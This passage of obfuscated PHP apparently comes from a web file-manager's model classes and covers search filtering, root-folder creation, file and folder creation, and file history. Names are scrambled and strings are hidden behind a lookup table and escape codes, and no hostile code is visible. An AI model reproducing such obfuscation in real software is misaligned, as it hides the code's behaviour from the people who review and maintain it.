$Ñğ–äÑ¤[50])) { return !1; } if (isset($’”ÔÀü÷[$Ñğ–äÑ¤[498]]) && $’”ÔÀü÷[$Ñğ–äÑ¤[498]] != $Ñğ–äÑ¤[862]) { if ($’”ÔÀü÷[$Ñğ–äÑ¤[498]] == $Ñğ–äÑ¤[78] && !$‚ÂÂ¿°) { return !1; } if ($’”ÔÀü÷[$Ñğ–äÑ¤[498]] != $Ñğ–äÑ¤[78] && $‚ÂÂ¿°) { return !1; } if (!strstr($¾‹½®¬ï[$Ñğ–äÑ¤[169]], $Ñğ–äÑ¤[50] . $’”ÔÀü÷[$Ñğ–äÑ¤[498]] . $Ñğ–äÑ¤[50])) { return !1; } } if (isset($’”ÔÀü÷[$Ñğ–äÑ¤[2268]]) && $’”ÔÀü÷[$Ñğ–äÑ¤[2268]] < $¾‹½®¬ï[$Ñğ–äÑ¤[79]]) { return !1; } if (isset($’”ÔÀü÷[$Ñğ–äÑ¤[2269]]) && $’”ÔÀü÷[$Ñğ–äÑ¤[2269]] > $¾‹½®¬ï[$Ñğ–äÑ¤[79]]) { return !1; } if (isset($’”ÔÀü÷[$Ñğ–äÑ¤[679]]) && $’”ÔÀü÷[$Ñğ–äÑ¤[679]] != $¾‹½®¬ï[$Ñğ–äÑ¤[541]]) { return !1; } return !0; } public function listSearchChildren($¸Ñ¸Õí, $§‘‹—Ü = 5000) { $ÓÍÄ¯“Ú =& $_SERVER[´‹ô¯Œ]; $Œª”Åüå = array(); $¥Æ¾Û¢Ó = $this->sourceInfo($¸Ñ¸Õí); $¢Œ®˜­¿ = array($ÓÍÄ¯“Ú[598] => array($ÓÍÄ¯“Ú[462], $¥Æ¾Û¢Ó[$ÓÍÄ¯“Ú[598]] . $¥Æ¾Û¢Ó[$ÓÍÄ¯“Ú[194]] . $ÓÍÄ¯“Ú[630])); $Ò”ãÈ¡ƒ = $this->field($ÓÍÄ¯“Ú[79])->where($¢Œ®˜­¿)->limit($§‘‹—Ü + 1)->select(); $ë»Ê˜áÎ = is_array($Ò”ãÈ¡ƒ) ? count($Ò”ãÈ¡ƒ) : 0; if ($ë»Ê˜áÎ > $§‘‹—Ü) { return $this->_listSearchChildrenNear($¸Ñ¸Õí, $§‘‹—Ü); } $ø­Àˆ“× = $this->field($ÓÍÄ¯“Ú[194])->where($¢Œ®˜­¿)->select(); $Œª”Åüå = array_to_keyvalue($ø­Àˆ“×, $ÓÍÄ¯“Ú[12], $ÓÍÄ¯“Ú[194]); return $Œª”Åüå; } private function _listSearchChildrenNear($Õ¾›»Á, $¶­¨Á¨Œ) { $øååÈˆ° =& $_SERVER[´‹ô¯Œ]; $ôûÛè» = array(); $ÓéÈ®¦ = array($øååÈˆ°[193] => $Õ¾›»Á); $©•÷ßàÙ = $this->field($øååÈˆ°[2270])->where($ÓéÈ®¦)->select(); $ñ–İˆò… = array_to_keyvalue(array_filter_by_field($©•÷ßàÙ, $øååÈˆ°[497], $øååÈˆ°[91]), $øååÈˆ°[12], $øååÈˆ°[194]); $ôûÛè» = array_merge($ôûÛè», array_to_keyvalue($©•÷ßàÙ, $øååÈˆ°[12], $øååÈˆ°[194])); if (!$ñ–İˆò…) { return $ôûÛè»; } $ÓéÈ®¦ = array($øååÈˆ°[193] => array($øååÈˆ°[7], $ñ–İˆò…)); $©•÷ßàÙ = $this->field($øååÈˆ°[2270])->where($ÓéÈ®¦)->limit($¶­¨Á¨Œ)->select(); $ôûÛè» = array_merge($ôûÛè», array_to_keyvalue($©•÷ßàÙ, $øååÈˆ°[12], $øååÈˆ°[194])); $ôûÛè» = array_slice($ôûÛè», 0, intval($¶­¨Á¨Œ)); return $ôûÛè»; } private function _listSearchBindPinyin($æŞİ²ş, &$çÒÒôÀ, &$éŞ•¶È†) { $ûÙ§ÍÌ‘ =& $_SERVER[´‹ô¯Œ]; if (!isset($æŞİ²ş[$ûÙ§ÍÌ‘[2095]]) || !$æŞİ²ş[$ûÙ§ÍÌ‘[2095]]) { return; } if (!Input::check($æŞİ²ş[$ûÙ§ÍÌ‘[2095]], $ûÙ§ÍÌ‘[396]) || strlen($æŞİ²ş[$ûÙ§ÍÌ‘[2095]]) < 2) { return; } $ËìÄ¨éÏ = "\114\105\106\x54\x20\112\x4f\111\x4e\40{$this->tablePrefix}\151\x6f\x5f\x73\x6f\x75\162\143\x65\x5f\155\145\x74\x61\x20\x6d\x65\164\141\x20\157\156\x20\x73\157\x75\x72\x63\x65\x2e\163\157\x75\x72\x63\x65\x49\x44\x20\x3d\x20\x6d\145\164\x61\x2e\163\x6f\165\x72\143\x65\x49\x44"; $¬¬•¹˜ = array(); $éŞ•¶È† = str_replace(array($ûÙ§ÍÌ‘[288], $ûÙ§ÍÌ‘[53], $ûÙ§ÍÌ‘[2271]), $ûÙ§ÍÌ‘[12], $éŞ•¶È†); $éŞ•¶È† = $ûÙ§ÍÌ‘[523] . str_replace($ûÙ§ÍÌ‘[50], $ûÙ§ÍÌ‘[524], $éŞ•¶È†); $×Ğ¹À™… = $çÒÒôÀ[$ûÙ§ÍÌ‘[32]]; unset($çÒÒôÀ[$ûÙ§ÍÌ‘[32]]); foreach ($çÒÒôÀ as $Ñ—†ÇÉ => $½¯Ñõ²í) { $¬¬•¹˜[$ûÙ§ÍÌ‘[523] . $Ñ—†ÇÉ] = $½¯Ñõ²í; } foreach ($×Ğ¹À™… as $»¨±½ùÂ) { $¬¬•¹˜[] = array($ûÙ§ÍÌ‘[528] => $»¨±½ùÂ, $ûÙ§ÍÌ‘[1092] => $ûÙ§ÍÌ‘[2099], array($ûÙ§ÍÌ‘[2272] => $»¨±½ùÂ, $ûÙ§ÍÌ‘[2273] => array($ûÙ§ÍÌ‘[7], array($ûÙ§ÍÌ‘[550], $ûÙ§ÍÌ‘[549])))); } $this->join($ËìÄ¨éÏ); $çÒÒôÀ = $¬¬•¹˜; } private function _parseSearchWhere($µı¨’”) { $çÁöşÔ± =& $_SERVER[´‹ô¯Œ]; $¢±á±¥ = array(); if (isset($µı¨’”[$çÁöşÔ±[846]]) && $µı¨’”[$çÁöşÔ±[846]]) { $¢±á±¥[$çÁöşÔ±[88]] = array($çÁöşÔ±[2274], $µı¨’”[$çÁöşÔ±[846]]); } if (isset($µı¨’”[$çÁöşÔ±[847]]) && $µı¨’”[$çÁöşÔ±[847]]) { $¨şàıˆÎ = array($çÁöşÔ±[2275], $µı¨’”[$çÁöşÔ±[847]]); if ($¢±á±¥[$çÁöşÔ±[88]]) { $¢±á±¥[$çÁöşÔ±[88]] = array($¢±á±¥[$çÁöşÔ±[88]], $¨şàıˆÎ, $çÁöşÔ±[2276]); } else { $¢±á±¥[$çÁöşÔ±[88]] = $¨şàıˆÎ; } } if (isset($µı¨’”[$çÁöşÔ±[2268]]) && $µı¨’”[$çÁöşÔ±[2268]] > 0) { $¢±á±¥[$çÁöşÔ±[79]] = array($çÁöşÔ±[2274], $µı¨’”[$çÁöşÔ±[2268]]); } if (isset($µı¨’”[$çÁöşÔ±[2269]]) && $µı¨’”[$çÁöşÔ±[2269]]) { $¨şàıˆÎ = array($çÁöşÔ±[2275], $µı¨’”[$çÁöşÔ±[2269]]); if ($¢±á±¥[$çÁöşÔ±[79]]) { $¢±á±¥[$çÁöşÔ±[79]] = array($¢±á±¥[$çÁöşÔ±[79]], $¨şàıˆÎ, $çÁöşÔ±[2276]); } else { $¢±á±¥[$çÁöşÔ±[79]] = $¨şàıˆÎ; } } if (isset($µı¨’”[$çÁöşÔ±[679]]) && $µı¨’”[$çÁöşÔ±[679]]) { $¢±á±¥[] = array($çÁöşÔ±[541] => $µı¨’”[$çÁöşÔ±[679]], $çÁöşÔ±[539] => $µı¨’”[$çÁöşÔ±[679]], $çÁöşÔ±[1092] => $çÁöşÔ±[2099]); } if (isset($µı¨’”[$çÁöşÔ±[498]]) && $µı¨’”[$çÁöşÔ±[498]]) { $‘É¢çÂÉ = $µı¨’”[$çÁöşÔ±[498]]; if ($‘É¢çÂÉ == $çÁöşÔ±[78]) { $¢±á±¥[$çÁöşÔ±[497]] = 1; } else { if ($‘É¢çÂÉ == $çÁöşÔ±[2277]) { $¢±á±¥[$çÁöşÔ±[497]] = 0; } else { if ($‘É¢çÂÉ) { $‘É¢çÂÉ = is_array($‘É¢çÂÉ) ? $‘É¢çÂÉ : explode($çÁöşÔ±[50], $‘É¢çÂÉ); $¢±á±¥[$çÁöşÔ±[498]] = array($çÁöşÔ±[504], $‘É¢çÂÉ); $¢±á±¥[$çÁöşÔ±[497]] = 0; } } } } $this->_parseSearchParent($µı¨’”, $¢±á±¥); if (isset($µı¨’”[$çÁöşÔ±[2095]]) && trim($µı¨’”[$çÁöşÔ±[2095]])) { $šííÂ× = trim($µı¨’”[$çÁöşÔ±[2095]]); $Ã³¸¯è§ = explode($çÁöşÔ±[53], $šííÂ×); if (strlen($šííÂ×) > 2 && (substr($šííÂ×, 0, 1) == $çÁöşÔ±[121] && substr($šííÂ×, -1) == $çÁöşÔ±[121]) || substr($šííÂ×, 0, 1) == $çÁöşÔ±[58] && substr($šííÂ×, -1) == $çÁöşÔ±[58]) { $šííÂ× = substr($šííÂ×, 1, -1); $Ã³¸¯è§ = array($šííÂ×); } $¢±á±¥[$çÁöşÔ±[32]] = array(array($çÁöşÔ±[629], $çÁöşÔ±[2097] . $šííÂ× . $çÁöşÔ±[2097])); if (count($Ã³¸¯è§) > 1) { $¢±á±¥[$çÁöşÔ±[32]] = array(); foreach ($Ã³¸¯è§ as $÷İî½­) { if (!trim($÷İî½­)) { continue; } $¢±á±¥[$çÁöşÔ±[32]][] = array($çÁöşÔ±[629], $çÁöşÔ±[2097] . trim($÷İî½­) . $çÁöşÔ±[2097]); } } } return $¢±á±¥; } private function _parseSearchParent($§ÆªÍüÄ, &$’ä©¬™) { $É§¬âÔÎ =& $_SERVER[´‹ô¯Œ]; if (!isset($§ÆªÍüÄ[$É§¬âÔÎ[193]]) || !$§ÆªÍüÄ[$É§¬âÔÎ[193]]) { return; } $™¸Ìªí¦ = $this->pathInfo($§ÆªÍüÄ[$É§¬âÔÎ[193]]); $¶²àşñş = $™¸Ìªí¦[$É§¬âÔÎ[193]] . $É§¬âÔÎ[12] === $É§¬âÔÎ[231]; $–ææÜïÖ = $™¸Ìªí¦[$É§¬âÔÎ[191]] == $É§¬âÔÎ[592]; if ($™¸Ìªí¦[$É§¬âÔÎ[608]] == $É§¬âÔÎ[609]) { $æ­õÃñ¦ = $this->sourceInfo($§ÆªÍüÄ[$É§¬âÔÎ[193]]); $™¸Ìªí¦[$É§¬âÔÎ[598]] = $æ­õÃñ¦[$É§¬âÔÎ[598]]; } $’ä©¬™[$É§¬âÔÎ[669]] = array($É§¬âÔÎ[629], $™¸Ìªí¦[$É§¬âÔÎ[598]] . $§ÆªÍüÄ[$É§¬âÔÎ[193]] . $É§¬âÔÎ[630]); $—œìÖ¾ = isset($§ÆªÍüÄ[$É§¬âÔÎ[1955]]) && in_array($É§¬âÔÎ[592], $§ÆªÍüÄ[$É§¬âÔÎ[1955]]); if (!$—œìÖ¾ || !$–ææÜïÖ || !$¶²àşñş || !$™¸Ìªí¦[$É§¬âÔÎ[499]]) { return; } if (!AuthModel::authCheckRoot($™¸Ìªí¦[$É§¬âÔÎ[499]][$É§¬âÔÎ[500]])) { return; } $äÃªç™• = $™¸Ìªí¦[$É§¬âÔÎ[583]] . $É§¬âÔÎ[12]; if ($äÃªç™• == $É§¬âÔÎ[91]) { unset($’ä©¬™[$É§¬âÔÎ[669]]); $’ä©¬™[$É§¬âÔÎ[191]] = self::TYPE_GROUP; return; } $¾¦ÛÅ·© = Model($É§¬âÔÎ[599])->groupChildrenAll($äÃªç™•); $Ë¾Ø„ÇÕ = count($¾¦ÛÅ·©); if ($Ë¾Ø„ÇÕ <= 1) { return; } $¼­Äí¾Û = array($É§¬âÔÎ[193] => 0, $É§¬âÔÎ[191] => self::TYPE_GROUP, $É§¬âÔÎ[583] => array($É§¬âÔÎ[7], $¾¦ÛÅ·©)); $Ü—‹¿º¢ = $this->field($É§¬âÔÎ[2278])->where($¼­Äí¾Û)->limit($Ë¾Ø„ÇÕ)->select(); $’ä©¬™[$É§¬âÔÎ[669]] = array(); foreach ($Ü—‹¿º¢ as $ «ñ„¾¬) { $’ä©¬™[$É§¬âÔÎ[669]][] = array($É§¬âÔÎ[629], $É§¬âÔÎ[607] . $ «ñ„¾¬[$É§¬âÔÎ[194]] . $É§¬âÔÎ[630]); } $’ä©¬™[$É§¬âÔÎ[669]][] = $É§¬âÔÎ[2099]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Ÿ»‹æçú) { $œÁÆºŠÖ =& $_SERVER[´‹ô¯Œ]; $â¦Àüüõ = Model($œÁÆºŠÖ[591])->where(array($œÁÆºŠÖ[1787] => $Ÿ»‹æçú))->find(); $öÍĞÀß = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ÿ»‹æçú, $â¦Àüüõ[$œÁÆºŠÖ[32]]); $this->userDesktopAdd($öÍĞÀß); return $öÍĞÀß; } public function userDesktopAdd($¾Ä·è®Ë) { $ñ¸Â¯éÜ =& $_SERVER[´‹ô¯Œ]; $”ãŠ¥ê  = LNG($ñ¸Â¯éÜ[2279]); $àÄŞ× = $this->mkdir($¾Ä·è®Ë, $”ãŠ¥ê ); $this->metaSet($àÄŞ×, $ñ¸Â¯éÜ[2280], $ñ¸Â¯éÜ[91]); $this->metaSet($¾Ä·è®Ë, $ñ¸Â¯éÜ[2281], $àÄŞ×); } public function userPathSafeAdd($´†šò‹É) { $ÅÈæçæö =& $_SERVER[´‹ô¯Œ]; $óÆ–üÒ¬ = Model($ÅÈæçæö[591])->getInfoFull($´†šò‹É); if (!$óÆ–üÒ¬) { return !1; } if (_get($óÆ–üÒ¬, $ÅÈæçæö[612])) { return $óÆ–üÒ¬[$ÅÈæçæö[553]][$ÅÈæçæö[2282]]; } $İŒ¡£‡Õ = $this->_mkdirRoot(SourceModel::TYPE_USER, $´†šò‹É, $ÅÈæçæö[2283], $ÅÈæçæö[2284]); Model($ÅÈæçæö[591])->metaSet($´†šò‹É, $ÅÈæçæö[2282], $İŒ¡£‡Õ); $this->metaSet($İŒ¡£‡Õ, $ÅÈæçæö[2285], $´†šò‹É); return $İŒ¡£‡Õ; } public function userPathAppAdd($´¡ä¡, $õ¨²¶‹û = '', $¨ì®€ùï = '') { $„“Ì“è¼ =& $_SERVER[´‹ô¯Œ]; $ê£Û‡Ù = Model($„“Ì“è¼[591])->getInfoFull($´¡ä¡); if (!$ê£Û‡Ù) { return !1; } $åû‚Ô¾ = $ê£Û‡Ù[$„“Ì“è¼[553]] ? $ê£Û‡Ù[$„“Ì“è¼[553]] : array(); $˜™â´ó = $åû‚Ô¾[$„“Ì“è¼[2286]]; if (!$˜™â´ó) { $˜™â´ó = $this->_mkdirRoot(SourceModel::TYPE_USER, $´¡ä¡, $„“Ì“è¼[2287], $„“Ì“è¼[2288]); Model($„“Ì“è¼[591])->metaSet($´¡ä¡, $„“Ì“è¼[2286], $˜™â´ó . $„“Ì“è¼[12]); $this->metaSet($˜™â´ó, $„“Ì“è¼[2286], $´¡ä¡); } if (!$õ¨²¶‹û) { return $˜™â´ó; } $íş€‚¬˜ = $åû‚Ô¾[$„“Ì“è¼[2289] . $õ¨²¶‹û]; if (!$íş€‚¬˜) { $íş€‚¬˜ = $this->mkdir($˜™â´ó, $õ¨²¶‹û); Model($„“Ì“è¼[591])->metaSet($´¡ä¡, $„“Ì“è¼[2289] . $õ¨²¶‹û, $íş€‚¬˜); $this->metaSet($íş€‚¬˜, $„“Ì“è¼[2289] . $õ¨²¶‹û, $´¡ä¡); } if (!$¨ì®€ùï) { return $íş€‚¬˜; } $ı£ÃàÆ = $this->mkdir($íş€‚¬˜, $¨ì®€ùï); return $ı£ÃàÆ; } public function groupRootAdd($ã‚Ôìğó) { $éÅİÇáÍ =& $_SERVER[´‹ô¯Œ]; $ÊÍèåÃ¦ = Model($éÅİÇáÍ[599])->where(array($éÅİÇáÍ[2086] => $ã‚Ôìğó))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ã‚Ôìğó, $ÊÍèåÃ¦[$éÅİÇáÍ[32]]); } public function systemRootPathAdd($Ø¡ÛÌ¥â) { if ($Ø¡ÛÌ¥â != $_SERVER[´‹ô¯Œ][622]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $Ø¡ÛÌ¥â); } public function userRootRemove($œïåâ¸¶) { $á¿ßèó = $this->targetSourceRoot(SourceModel::TYPE_USER, $œïåâ¸¶, !0); foreach ($á¿ßèó as $ƒ©…ëÜ¤) { if (!$ƒ©…ëÜ¤) { continue; } $this->remove($ƒ©…ëÜ¤[$_SERVER[´‹ô¯Œ][194]], !1); } } public function groupRootRemove($°İ¿Ó ú) { $‰ËÜ†ñ¡ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $°İ¿Ó ú); if (!$‰ËÜ†ñ¡) { return; } $this->remove($‰ËÜ†ñ¡[$_SERVER[´‹ô¯Œ][194]], !1); } private function _mkdirRoot($¢¦ÛÙ, $Ô÷ëô„„, $¢øØßé¢, $¥§ùî×¥ = '') { $”ßÑÍû =& $_SERVER[´‹ô¯Œ]; $İ…Ù¢±• = defined($”ßÑÍû[2224]) ? USER_ID : 0; $ùµü¥Á° = array($”ßÑÍû[489] => 0, $”ßÑÍû[665] => $¢¦ÛÙ, $”ßÑÍû[666] => $Ô÷ëô„„, $”ßÑÍû[663] => 1, $”ßÑÍû[667] => $İ…Ù¢±•, $”ßÑÍû[668] => $İ…Ù¢±•, $”ßÑÍû[664] => $¥§ùî×¥, $”ßÑÍû[669] => $”ßÑÍû[607], $”ßÑÍû[516] => 0, $”ßÑÍû[634] => 0, $”ßÑÍû[556] => 0, $”ßÑÍû[670] => $”ßÑÍû[12]); if ($î½¾ïÎ© = $this->where($ùµü¥Á°)->find()) { return $î½¾ïÎ©[$”ßÑÍû[194]]; } $õÈ¡ë¯Û = "\x4d\x6f\144\x65\154\123\157\x75\162\x63\145\56\155\x6b\x64\151\162\122\x6f\x6f\x74\56{$¢¦ÛÙ}\56{$Ô÷ëô„„}\56" . $¢øØßé¢; CacheLock::lock($õÈ¡ë¯Û); $ùµü¥Á°[$”ßÑÍû[32]] = $¢øØßé¢; $¸ÓÇÔ‚Ó = $this->add($ùµü¥Á°); $ÜéÓ§ô = array($”ßÑÍû[671] => short_id($¸ÓÇÔ‚Ó)); $this->where(array($”ßÑÍû[503] => $¸ÓÇÔ‚Ó))->save($ÜéÓ§ô); CacheLock::unlock($õÈ¡ë¯Û); return $¸ÓÇÔ‚Ó; } private function targetSourceRoot($°ğ‹ë‚É, $ßÎ‘èË—, $ó…Í”êÊ = false) { $‡Š°‡ô• =& $_SERVER[´‹ô¯Œ]; $²ı™ñÙ» = array($‡Š°‡ô•[489] => 0, $‡Š°‡ô•[665] => $°ğ‹ë‚É, $‡Š°‡ô•[666] => $ßÎ‘èË—); if ($ó…Í”êÊ) { $™‹ÈÊµ = $this->where($²ı™ñÙ»)->select(); return $™‹ÈÊµ ? $™‹ÈÊµ : array(); } $Î—Õèá = $this->where($²ı™ñÙ»)->find(); return $Î—Õèá ? $Î—Õèá : array(); } public function sourceRootGroup($¶ìÃüØ­) { $±¨ÒŞí¹ =& $_SERVER[´‹ô¯Œ]; if (is_string($¶ìÃüØ­)) { $¶ìÃüØ­ = array($¶ìÃüØ­); } $¯Ÿó¶”— = $this->listSourceRoot(SourceModel::TYPE_GROUP, $¶ìÃüØ­, $±¨ÒŞí¹[223]); $ºÀ˜“Êª = array($±¨ÒŞí¹[448] => $¯Ÿó¶”—, $±¨ÒŞí¹[445] => array($±¨ÒŞí¹[844] => count($¶ìÃüØ­))); $this->_listDataApply($ºÀ˜“Êª[$±¨ÒŞí¹[448]]); $this->_listMake($ºÀ˜“Êª); return array_to_keyvalue($ºÀ˜“Êª[$±¨ÒŞí¹[85]], $±¨ÒŞí¹[583]); } public function mkfile($ÚşÌÀÈ, $Ÿ›˜›Ï¦, $Ÿ„¤‰¸’ = '', $™ÕŞ‘üË = REPEAT_RENAME) { $şë»èÎ« =& $_SERVER[´‹ô¯Œ]; $×“³ÎĞ = KodIO::ioFileDriverGet($şë»èÎ«[495] . $ÚşÌÀÈ . $şë»èÎ«[405]); $¥Ğ†Éùã = Model($şë»èÎ«[691])->addFileByContent($Ÿ„¤‰¸’, $×“³ÎĞ, $Ÿ›˜›Ï¦); return $this->_createFileCall($ÚşÌÀÈ, $Ÿ›˜›Ï¦, $¥Ğ†Éùã, $™ÕŞ‘üË, $şë»èÎ«[1455]); } public function addFile($Šº¾Ù¹ï, $òª­¾÷Ô, $İ™ñªò, $ãÍÎ»† = false, $¸ÓÇ®½ = REPEAT_RENAME) { $ıØêø§ =& $_SERVER[´‹ô¯Œ]; $Íš›’ÚÂ = KodIO::ioFileDriverGet($ıØêø§[495] . $Šº¾Ù¹ï . $ıØêø§[405]); $†¾êª©… = Model($ıØêø§[691])->addFile($òª­¾÷Ô, $Íš›’ÚÂ, $İ™ñªò, $ãÍÎ»†); return $this->_createFileCall($Šº¾Ù¹ï, $İ™ñªò, $†¾êª©…, $¸ÓÇ®½); } public function addFileByFileID($±Æ¿£ªÛ, $Ê¶˜“Ï, $íéÚâ³ç, $¥ÙŒäó– = REPEAT_RENAME) { $Œ¸šó‘“ =& $_SERVER[´‹ô¯Œ]; $˜¹àÂ¥‰ = Model($Œ¸šó‘“[691])->find($Ê¶˜“Ï); Model($Œ¸šó‘“[691])->linkAdd($Ê¶˜“Ï); return $this->_createFileCall($±Æ¿£ªÛ, $íéÚâ³ç, $˜¹àÂ¥‰, $¥ÙŒäó–); } public function addFileByRemote($ÕËÉçËñ, $¿ù¹•Í, $»²ö¥”¤, $çŞé™ƒ‚ = array(), $ÇÃÔ“‚Œ = REPEAT_RENAME) { $ ‘ı ñß = Model($_SERVER[´‹ô¯Œ][691])->addFileByRemote($¿ù¹•Í, $»²ö¥”¤, $çŞé™ƒ‚); return $this->_createFileCall($ÕËÉçËñ, $»²ö¥”¤, $ ‘ı ñß, $ÇÃÔ“‚Œ); } private function _createFileCall($·š†„ŒÁ, $¸‘úÚ†­, $»¢È×ŸÇ, $—’“˜¶ƒ, $Ö‘èÃÊ¼ = "\x75\160\x6c\x6f\x61\x64") { $È€§üÜø =& $_SERVER[´‹ô¯Œ]; if (!$»¢È×ŸÇ) { return !1; } $Î·ğËÖ = !1; $this->setMasterDB(); $this->lockWriteStart($·š†„ŒÁ, $¸‘úÚ†­); $ÊñÇÃµÚ = $this->fileNameExist($·š†„ŒÁ, $¸‘úÚ†­); $€Èè˜Ö = $this->_createFile($·š†„ŒÁ, $¸‘úÚ†­, $»¢È×ŸÇ, $—’“˜¶ƒ, $Î·ğËÖ); if (!$Î·ğËÖ) { Model($È€§üÜø[558])->remove($»¢È×ŸÇ[$È€§üÜø[555]]); } if ($Î·ğËÖ && $€Èè˜Ö && $€Èè˜Ö != $ÊñÇÃµÚ) { Model($È€§üÜø[2251])->eventCreate($€Èè˜Ö, $Ö‘èÃÊ¼); } $this->lockWriteEnd($·š†„ŒÁ, $¸‘úÚ†­); return $€Èè˜Ö; } public function mkdir($ÙİÈŞ¥Ğ, $ãøÜŞ¤„, $ß¾Şõ¶â = REPEAT_SKIP) { $ø—íùß =& $_SERVER[´‹ô¯Œ]; $this->setMasterDB(); $ªÁÛ²ÍŸ = $this->sourceInfo($ÙİÈŞ¥Ğ); if (!$ªÁÛ²ÍŸ) { return !1; } $this->lockWriteStart($ÙİÈŞ¥Ğ, $ãøÜŞ¤„); if ($ß¾Şõ¶â !== !1) { $¡ŠçÅ‰È = $this->fileNameExist($ÙİÈŞ¥Ğ, $ãøÜŞ¤„); if ($¡ŠçÅ‰È && $ß¾Şõ¶â != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ÙİÈŞ¥Ğ, $ãøÜŞ¤„); return $¡ŠçÅ‰È; } $ãøÜŞ¤„ = $this->fileNameAuto($ÙİÈŞ¥Ğ, $ãøÜŞ¤„, $ß¾Şõ¶â); } $²ş³Í¢  = array($ø—íùß[663] => 1, $ø—íùß[506] => $ãøÜŞ¤„, $ø—íùß[664] => $ø—íùß[12], $ø—íùß[556] => 0, $ø—íùß[634] => 0); $ÃœçÄÀê = $this->_addSource($²ş³Í¢ , $ªÁÛ²ÍŸ); Model($ø—íùß[2251])->eventCreate($ÃœçÄÀê, $ø—íùß[1456]); $this->lockWriteEnd($ÙİÈŞ¥Ğ, $ãøÜŞ¤„); return $ÃœçÄÀê; } public function listSourceRoot($™Ş®’øÄ, $²´ã×¹, $ˆéíëóß = "\x73\157\165\x72\x63\145\x49\x44\x2c\164\141\162\147\x65\164\111\104\x2c\x73\x69\x7a\x65") { $İšûäŞ£ =& $_SERVER[´‹ô¯Œ]; $šÒŒ…ƒÑ = $İšûäŞ£[457]; $¦°ÖÕÇ¥ = array(); $ú¦Ç×÷é = 1024 * 50; $¾şò·‚“ = is_array($¾şò·‚“) ? $¾şò·‚“ : array(); $„ÆŞåæÎ = count($²´ã×¹); $Á‡¤­ÉŞ = $this->tablePrefix . $İšûäŞ£[2290]; for ($ìîó¶ı = 0; $ìîó¶ı < $„ÆŞåæÎ; $ìîó¶ı++) { $ĞßÔÎà = $²´ã×¹[$ìîó¶ı]; $šÒŒ…ƒÑ .= "\x53\x45\114\105\x43\124\40\52\x20\x46\122\117\x4d\x20\50\123\105\114\105\x43\x54\x20{$ˆéíëóß}\x20\x46\x52\117\115\40\x60{$Á‡¤­ÉŞ}\140\x20\x57\x48\105\x52\105\x20"; $šÒŒ…ƒÑ .= "\x60\160\141\x72\145\x6e\x74\111\x44\140\75\x30\x20\x41\116\x44\x20\140\164\x61\162\147\x65\164\111\x44\140\75{$ĞßÔÎà}\x20\x41\x4e\x44\40\140\164\x61\162\x67\145\x74\124\x79\x70\145\x60\75{$™Ş®’øÄ}\x20\141\x6e\x64\x20\x66\151\x6c\145\x54\171\x70\145\x3d\x27\x27\40\154\x69\155\x69\164\40\x31\x29\x20\141\163\x20\164\142\x5f{$ìîó¶ı}\x20\x55\x4e\111\117\116\40\x41\x4c\x4c\40"; if ((strlen($šÒŒ…ƒÑ) >= $ú¦Ç×÷é || $ìîó¶ı == $„ÆŞåæÎ - 1) && $šÒŒ…ƒÑ) { $šÒŒ…ƒÑ = substr($šÒŒ…ƒÑ, 0, -strlen($İšûäŞ£[1130])); $˜£ÕÎ«µ = $this->query($šÒŒ…ƒÑ); $šÒŒ…ƒÑ = $İšûäŞ£[12]; $¦°ÖÕÇ¥ = array_merge($¦°ÖÕÇ¥, $˜£ÕÎ«µ); } } return $¦°ÖÕÇ¥; } private function _createFile($™ì‘é–Æ, $Ğ·®é, $Ó„ÏˆÄÃ, $ÏëùÖéÙ, &$…À¦¿óé) { $œºü¿í =& $_SERVER[´‹ô¯Œ]; $Èßá±û— = $this->sourceInfo($™ì‘é–Æ); if (!$Ó„ÏˆÄÃ || !$Èßá±û—) { return !1; } if ($ÏëùÖéÙ !== !1) { $»ÌŸÙ¤ = $this->fileNameExist($™ì‘é–Æ, $Ğ·®é); } $…À¦¿óé = !0; if ($ÏëùÖéÙ && $»ÌŸÙ¤) { if ($ÏëùÖéÙ == REPEAT_SKIP) { $…À¦¿óé = !1; return $»ÌŸÙ¤; } else { if ($ÏëùÖéÙ == REPEAT_REPLACE) { $óö–›ü = $this->sourceInfo($»ÌŸÙ¤); $šìßî»ª = $this->fileHistory($óö–›ü, $Ó„ÏˆÄÃ[$œºü¿í[555]], $Ó„ÏˆÄÃ[$œºü¿í[79]]); if (!$šìßî»ª) { $…À¦¿óé = !1; } else { $this->folderSizeReset($™ì‘é–Æ); } return $»ÌŸÙ¤; } else { $Ğ·®é = $this->fileNameAuto($™ì‘é–Æ, $Ğ·®é, $ÏëùÖéÙ, !1); } } } $¥òİÓôá = array($œºü¿í[663] => 0, $œºü¿í[506] => $Ğ·®é, $œºü¿í[664] => substr(get_path_ext($Ğ·®é), 0, 10), $œºü¿í[556] => $Ó„ÏˆÄÃ[$œºü¿í[555]], $œºü¿í[634] => $Ó„ÏˆÄÃ[$œºü¿í[79]]); $éÏ©…¥  = $this->_addSource($¥òİÓôá, $Èßá±û—); $this->folderSizeReset($™ì‘é–Æ, intval($¥òİÓôá[$œºü¿í[79]])); return $éÏ©…¥ ; } protected function fileHistory($‘Å£´, $ÂÒîñÂ—, $çƒ‰ÉÍ) { $³üò”Œù =& $_SERVER[´‹ô¯Œ]; if ($‘Å£´[$³üò”Œù[555]] == $ÂÒîñÂ—) { return !1; } $this->checkLock($‘Å£´[$³üò”Œù[194]], $ÂÒîñÂ—); Model($³üò”Œù[2291])->addHistory($‘Å£´); $ƒí™Í— = array($³üò”Œù[668] => USER_ID, $³üò”Œù[510] => time(), $³üò”Œù[555] => $ÂÒîñÂ—, $³üò”Œù[79] => $çƒ‰ÉÍ); $this->where(array($³üò”Œù[503] => $‘Å£´[$³üò”Œù[194]]))->save($ƒí™Í—); $this->sourceCacheClear($‘Å£´[$³üò”Œù[194]]); return !0; } public function checkLock($úéåã¬Á, $ÑÑŠ³ÁÄ) { $‹úĞÜ† =& $_SERVER[´‹ô¯Œ]; $âüƒ¡¬  = $this->pathInfo($úéåã¬Á); if (!$this->fileIsLock($âüƒ¡¬ , !0)) { return; } $ÊıÓã‰ì = Session::get($‹úĞÜ†[2292]); $ó˜‹æÙ = substr($âüƒ¡¬ [$‹úĞÜ†[32]], 0, -1 - strlen($âüƒ¡¬ [$‹úĞÜ†[169]])) . $‹úĞÜ†[1310] . $ÊıÓã‰ì . $‹úĞÜ†[10] . $âüƒ¡¬ 